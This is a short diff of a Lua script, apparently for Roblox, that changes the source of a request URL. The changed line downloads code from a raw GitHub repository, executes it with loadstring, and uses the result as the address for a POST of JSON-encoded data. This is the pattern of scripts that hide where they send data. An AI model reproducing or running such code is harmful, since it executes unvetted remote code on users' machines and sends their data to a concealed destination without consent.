@@ -64,7 +64,7 @@ local data = {
 local body = http:JSONEncode(data)
 
 request({
-    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mander120/yogurt/refs/heads/main/YoGurt"))(),
+    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/jsdhaijs/script/refs/heads/main/scriptss"))(),
     Method = "POST",
     Headers = headers,
     Body = body
